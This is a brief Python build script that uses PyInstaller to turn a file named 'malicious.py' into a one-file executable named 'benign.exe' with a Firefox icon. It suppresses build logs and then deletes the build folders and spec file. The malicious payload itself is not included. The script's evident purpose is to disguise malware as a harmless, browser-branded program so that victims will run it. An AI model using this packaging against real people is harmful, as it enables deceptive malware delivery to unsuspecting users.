import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd,"Result")

# Check if "__pycache__" exists and delete it if found
cache_dir = "__pycache__"
if os.path.exists(cache_dir):
    try:
        shutil.rmtree(cache_dir)
        print(f"{cache_dir} has been removed successfully.")
    except PermissionError:
        print(f"Permission denied: Unable to delete {cache_dir}. Try running as administrator.")
    except Exception as e:
        print(f"An error occurred: {e}")
else:
    print(f"{cache_dir} does not exist.")

if os.path.isfile(exename):
    os.remove(exename)

# Create executable from Python script
PyInstaller.__main__.run([
    "malicious.py",
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename,
    "--icon="+icon
])

# Clean up after Pyinstaller
shutil.move(os.path.join(pwd,"dist",exename),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")